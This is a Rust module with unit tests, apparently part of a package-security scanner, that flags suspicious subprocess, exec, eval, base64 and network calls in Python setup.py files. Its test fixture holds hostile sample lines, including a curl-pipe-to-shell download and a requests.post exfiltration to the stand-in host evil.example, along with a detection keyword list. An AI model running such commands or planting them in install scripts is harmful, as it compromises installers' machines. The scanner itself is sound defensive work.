//! Suspicious-call detection for Python `setup.py`.
//!
//! `setup.py` is executed by `pip` at install time, so anything it does runs
//! on the installer's machine with their privileges — the direct analogue of
//! npm install scripts. This module scans the source *text* (no Python AST)
//! for the calls an install-time payload leans on:
//!
//! - [`SetupPyCall::Subprocess`] / [`SetupPyCall::OsSystem`] — shelling out
//!   (`subprocess.run(...)`, `import subprocess`, `os.system(...)`)
//! - [`SetupPyCall::Exec`] / [`SetupPyCall::Eval`] — dynamic code execution
//! - [`SetupPyCall::Base64Decode`] — deobfuscating an embedded payload
//! - [`SetupPyCall::Network`] — `urllib`/`requests` calls
//!
//! The scan is line-based: every line is checked, comments (`# ...`,
//! including trailing ones) are stripped first, and each hit is reported
//! with its 1-based [`BehavioralFinding::line`]. Calls inside a `def` are
//! still flagged — in a `setup.py` anything reachable can run during
//! install, and a human can judge the line in context from the number.

use crate::cve::severity::Severity;

use super::BehavioralFinding;

/// One of the suspicious call shapes [`scan_setup_py`] looks for.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum SetupPyCall {
    Subprocess,
    OsSystem,
    Exec,
    Eval,
    Base64Decode,
    Network,
}

impl SetupPyCall {
    /// How serious this call is when it appears in a `setup.py`; see
    /// `docs/severity.md`.
    pub fn severity(self) -> Severity {
        match self {
            // Command execution or shelling out during install.
            SetupPyCall::Subprocess
            | SetupPyCall::OsSystem
            | SetupPyCall::Exec
            | SetupPyCall::Eval => Severity::High,
            // Obfuscation and network I/O are strong indicators but not
            // proof of code execution on their own.
            SetupPyCall::Base64Decode | SetupPyCall::Network => Severity::Medium,
        }
    }

    /// Short description used in findings and reports.
    pub fn message(self) -> &'static str {
        match self {
            SetupPyCall::Subprocess => "subprocess call",
            SetupPyCall::OsSystem => "os.system call",
            SetupPyCall::Exec => "exec() call",
            SetupPyCall::Eval => "eval() call",
            SetupPyCall::Base64Decode => "base64.b64decode call",
            SetupPyCall::Network => "network call (urllib/requests)",
        }
    }
}

/// Scans `source` (a `setup.py`) for suspicious calls, returning one
/// finding per call kind per line, in line order. The reported file is
/// always `setup.py`; use [`scan_setup_py_in`] to label the findings with
/// a different path (e.g. when diffing two package trees).
pub fn scan_setup_py(source: &str) -> Vec<BehavioralFinding> {
    scan_setup_py_in("setup.py", source)
}

/// [`scan_setup_py`] with a caller-supplied file path for the findings.
pub fn scan_setup_py_in(file: &str, source: &str) -> Vec<BehavioralFinding> {
    let mut findings = Vec::new();
    for (index, raw_line) in source.lines().enumerate() {
        let line = strip_comment(raw_line);
        for call in calls_in_line(line) {
            findings.push(BehavioralFinding {
                file: file.to_string(),
                line: Some(index + 1),
                severity: call.severity(),
                message: call.message().to_string(),
            });
        }
    }
    findings
}

/// The distinct call kinds found on one (comment-stripped) line, in a
/// stable order.
fn calls_in_line(line: &str) -> Vec<SetupPyCall> {
    let mut calls = Vec::new();
    let mut push = |call: SetupPyCall| {
        if !calls.contains(&call) {
            calls.push(call);
        }
    };

    if has_subprocess(line) {
        push(SetupPyCall::Subprocess);
    }
    if has_call(line, "os.system") {
        push(SetupPyCall::OsSystem);
    }
    if has_bare_call(line, "exec") {
        push(SetupPyCall::Exec);
    }
    if has_bare_call(line, "eval") {
        push(SetupPyCall::Eval);
    }
    // `base64.b64decode(...)` or `b64decode(...)` after a direct import.
    if has_call(line, "base64.b64decode")
        || has_bare_call(line, "b64decode")
        || line.contains("import b64decode")
    {
        push(SetupPyCall::Base64Decode);
    }
    const NETWORK_CALLS: &[&str] = &[
        "urllib.request.urlopen",
        "urllib.request.urlretrieve",
        "urllib.request.Request",
        "urllib.urlopen",
        "requests.get",
        "requests.post",
        "requests.put",
        "requests.delete",
        "requests.head",
        "requests.patch",
        "requests.request",
        "requests.Session",
    ];
    if NETWORK_CALLS.iter().any(|prefix| has_call(line, prefix)) {
        push(SetupPyCall::Network);
    }

    calls
}

/// `subprocess` used as a call (`subprocess.run(...)`, `subprocess.Popen`)
/// or pulled in by an import (`import subprocess`,
/// `from subprocess import check_output`).
fn has_subprocess(line: &str) -> bool {
    let mut rest = line;
    while let Some(pos) = rest.find("subprocess") {
        let before = &rest[..pos];
        let after = &rest[pos + "subprocess".len()..];
        let boundary = after
            .chars()
            .next()
            .is_none_or(|c| !(c.is_alphanumeric() || c == '_'));
        if boundary && (is_dotted_call_after(after) || after.trim_start().starts_with("import")) {
            return true;
        }
        // `from subprocess import ...` or bare `import subprocess`
        if before.trim_end().ends_with("from") || before.trim_end().ends_with("import") {
            return true;
        }
        rest = after;
    }
    false
}

/// True when `prefix` appears as a call: identifier boundary before it,
/// optionally `.`, whitespace, then `(` — e.g. `requests.get(` but not
/// `install_requires=["requests"]`.
fn has_call(line: &str, prefix: &str) -> bool {
    let mut rest = line;
    while let Some(pos) = rest.find(prefix) {
        let before = &rest[..pos];
        let after = &rest[pos + prefix.len()..];
        let boundary = before
            .chars()
            .next_back()
            .is_none_or(|c| !(c.is_alphanumeric() || c == '_'));
        if boundary && is_call_after(after) {
            return true;
        }
        rest = after;
    }
    false
}

/// Like [`has_call`] but the prefix is a bare identifier (`exec(`), where
/// an identifier boundary on both sides is required, so `peval(` and
/// `my_eval_thing(` don't match while `eval(` and `obj.eval(` do.
fn has_bare_call(line: &str, name: &str) -> bool {
    let mut rest = line;
    while let Some(pos) = rest.find(name) {
        let before = &rest[..pos];
        let after = &rest[pos + name.len()..];
        let boundary_before = before
            .chars()
            .next_back()
            .is_none_or(|c| !(c.is_alphanumeric() || c == '_'));
        let boundary_after = after
            .chars()
            .next()
            .is_none_or(|c| !(c.is_alphanumeric() || c == '_'));
        if boundary_before && boundary_after && is_call_after(after) {
            return true;
        }
        rest = after;
    }
    false
}

/// True when what follows an identifier is a call — only whitespace may
/// intervene, so `base64.b64decode (payload)` counts but
/// `base64.b64decode` used as a bare value doesn't.
fn is_call_after(after: &str) -> bool {
    after.trim_start().starts_with('(')
}

/// Like [`is_call_after`] but permits a `.method` chain in between, so
/// `subprocess.run(...)` and `subprocess.Popen (...)` both count.
fn is_dotted_call_after(after: &str) -> bool {
    let mut rest = after.trim_start();
    // Zero or more `.method` segments, whitespace-tolerant.
    loop {
        let segment = rest
            .trim_start_matches('.')
            .trim_start_matches(|c: char| c.is_alphanumeric() || c == '_')
            .trim_start();
        if segment.len() == rest.len() {
            break; // no further `.method` segment
        }
        rest = segment;
    }
    rest.starts_with('(')
}

/// Drops a trailing `#` comment, respecting `'...'`/`"..."` quotes and
/// simple backslash escapes inside them. Doesn't attempt triple quotes —
/// a `#` inside a docstring is stripped like any other text, which errs
/// toward flagging, and the line number points a human at it.
fn strip_comment(line: &str) -> &str {
    let bytes = line.as_bytes();
    let mut quote: Option<u8> = None;
    let mut escaped = false;
    for (i, &b) in bytes.iter().enumerate() {
        if escaped {
            escaped = false;
            continue;
        }
        match quote {
            Some(q) => match b {
                b'\\' => escaped = true,
                b if b == q => quote = None,
                _ => {}
            },
            None => match b {
                b'\'' | b'"' => quote = Some(b),
                b'#' => return &line[..i],
                _ => {}
            },
        }
    }
    line
}

#[cfg(test)]
mod tests {
    use super::*;

    fn call_lines(source: &str, call: SetupPyCall) -> Vec<usize> {
        scan_setup_py(source)
            .into_iter()
            .filter(|f| f.message == call.message())
            .map(|f| f.line.expect("setup.py findings carry a line"))
            .collect()
    }

    const CLEAN: &str = "\
from setuptools import setup, find_packages

with open('README.md', encoding='utf-8') as f:
    long_description = f.read()

setup(
    name='example-pkg',
    version='1.2.3',
    description='A perfectly ordinary package',
    long_description=long_description,
    url='https://example.com/example-pkg',
    author='A Maintainer',
    license='MIT',
    packages=find_packages(),
    install_requires=['requests', 'urllib3'],
    python_requires='>=3.8',
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
    ],
)
";

    #[test]
    fn clean_setuptools_setup_py_is_not_flagged() {
        assert_eq!(scan_setup_py(CLEAN), Vec::new(), "clean setup.py: {CLEAN}");
    }

    const MALICIOUS: &str = "\
from setuptools import setup
import os
import subprocess

# eval(\"__import__('os').system('id')\") is just a comment
payload = 'aWQ='
os.system('curl http://evil.example/p.sh | sh')
subprocess.run(['wget', 'http://evil.example/bin'], check=False)
data = __import__('base64').b64decode(payload)
exec(data)
eval(\"print('hi')\")
import urllib.request
urllib.request.urlopen('http://evil.example/beacon')
import requests
requests.post('http://evil.example/exfil', data=data)
setup(name='example-pkg', version='1.2.4')
";

    #[test]
    fn malicious_sample_is_flagged_with_line_numbers() {
        let source = MALICIOUS;
        assert_eq!(call_lines(source, SetupPyCall::Subprocess), vec![3, 8]);
        assert_eq!(call_lines(source, SetupPyCall::OsSystem), vec![7]);
        assert_eq!(call_lines(source, SetupPyCall::Base64Decode), vec![9]);
        assert_eq!(call_lines(source, SetupPyCall::Exec), vec![10]);
        assert_eq!(call_lines(source, SetupPyCall::Eval), vec![11]);
        // Line 5's eval() is inside a comment and must not be flagged.
        assert_eq!(call_lines(source, SetupPyCall::Network), vec![13, 15]);
    }

    #[test]
    fn trailing_comments_do_not_trigger_calls() {
        assert_eq!(scan_setup_py("x = 1  # eval('nope')"), Vec::new());
        // A '#' inside a string is not a comment, so this eval( counts.
        assert_eq!(
            call_lines("url = 'http://x/#eval('", SetupPyCall::Eval),
            vec![1]
        );
    }

    #[test]
    fn plain_dependency_names_are_not_network_calls() {
        // install_requires naming a package is not a call.
        assert_eq!(
            scan_setup_py("install_requires=['requests', 'urllib3'],"),
            Vec::new()
        );
    }

    #[test]
    fn direct_b64decode_import_is_flagged() {
        assert_eq!(
            call_lines("from base64 import b64decode", SetupPyCall::Base64Decode),
            vec![1]
        );
    }

    #[test]
    fn one_finding_per_call_kind_per_line() {
        assert_eq!(
            call_lines(
                "subprocess.run(a) and subprocess.run(b)",
                SetupPyCall::Subprocess
            ),
            vec![1]
        );
    }

    #[test]
    fn lookalike_identifiers_are_not_calls() {
        assert_eq!(scan_setup_py("peval = 1"), Vec::new());
        assert_eq!(scan_setup_py("my_eval_thing = 1"), Vec::new());
        assert_eq!(scan_setup_py("os.system = cleanup"), Vec::new());
    }

    #[test]
    fn findings_use_the_supplied_file_name_and_severity() {
        let findings = scan_setup_py_in("pkg-1/setup.py", "os.system('id')");
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].file, "pkg-1/setup.py");
        assert_eq!(findings[0].severity, Severity::High);
    }
}
